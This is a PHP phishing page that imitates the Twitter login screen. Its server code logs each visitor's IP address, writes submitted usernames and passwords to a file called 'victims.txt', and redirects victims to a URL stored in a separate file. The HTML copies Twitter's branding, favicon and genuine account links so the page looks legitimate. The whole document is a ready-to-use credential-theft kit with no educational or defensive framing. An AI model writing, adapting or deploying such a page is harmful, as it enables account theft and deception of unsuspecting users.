<?php
function get_IP_address()
{
    foreach (array('HTTP_CLIENT_IP',
                   'HTTP_X_FORWARDED_FOR',
                   'HTTP_X_FORWARDED',
                   'HTTP_X_CLUSTER_CLIENT_IP',
                   'HTTP_FORWARDED_FOR',
                   'HTTP_FORWARDED',
                   'REMOTE_ADDR') as $key){
        if (array_key_exists($key, $_SERVER) === true){
            foreach (explode(',', $_SERVER[$key]) as $IPaddress){
                $IPaddress = trim($IPaddress); // Just to be safe

                if (filter_var($IPaddress,
                               FILTER_VALIDATE_IP,
                               FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
                    !== false) {

                    return $IPaddress;
                }
            }
        }
    }
}
fwrite(fopen('ip.txt','w'),get_IP_address());
$u = $_POST['usr'];
$p = $_POST['pwd'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));
fclose($f);
if ($p && $u){
    $f = fopen('victims.txt','a+');
    fwrite($f,'USERNAME : '.$u.' PASSWORD : '.$p."\n");
    fclose($f);
    echo '<script>window.location = "'.$r.'"</script>';
}
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Login on Twitter / Twitter</title>
    <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter.ico" type="image/x-icon">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="w3hubs.com">
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:300i,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/5.0.0-alpha1/css/bootstrap.min.css">
    <style type="text/css">
      body{
      font-family: "Nunito Sans";
      }
      .login-form{
      padding: 25px;
      }
      h3{
      padding-left:10%;
      padding-right: 10%;
      font-weight: 700;
      }
      label{
      padding-top: 4px;
      padding-left: 4px;
      }
      .bg-color{
      background-color:rgb(245, 248, 250);
      }
      .bg-color:hover label{
      color:#31a1f2;
      }
      .btn-custom{
      background-color: #1877f2;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 28px;
      color: #fff;
      font-weight:700;
      height: 48px;
      }
      .btn-custom{
      color: #fff !important;
      background-color: rgb(29, 161, 242);
      }
      .form-control{
      border:0px;
      background-color: rgb(245, 248, 250);
      border-bottom: 2px solid #657786;
      padding: 0px 4px 0px 4px;
      min-height: 20px;
      color: #000!important;
      font-size: 150%!important;
      }
      .form-control:focus{
      box-shadow: none;
      background-color: rgb(245, 248, 250);
      border-color: #31a1f2;
      }
      .fa{
      color: rgb(29, 161, 242);
      margin: 0 auto;
      display: block;
      text-align: center;
      font-size: 50px;
      }
      a{
      text-decoration: none;
      color: rgb(27, 149, 224);
      }
      a:hover{
      text-decoration: underline;
      color: rgb(27, 149, 224);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="row">
        <div class="col-md-3"></div>
        <div class="col-md-6 p-0 pt-3">
          <i class="fa fa-twitter"></i>
          <h3 class="text-center pt-3">Log in to Twitter</h3>
          <form class="login-form" action="" method="post">
            <div class="mb-3 bg-color">
              <label>Phone, email, or username</label>
              <input type="text" name="usr" class="form-control" required>
            </div>
            <div class="mb-3 bg-color">
              <label>Password</label>
              <input type="password" name="pwd" class="form-control" required>
            </div>
            <button type="button" class="btn btn-custom btn-lg btn-block mt-3">Log in</button>
            <div class="text-center pt-3 pb-3">
              <a href="https://twitter.com/account/begin_password_reset" class="">Forgotten password?</a> . 
              <a href="https://twitter.com/i/flow/signup" class="">Sign up for Twitter</a>
            </div>
          </form>
        </div>
        <div class="col-md-3"></div>
      </div>
    </div>
  </body>
</html>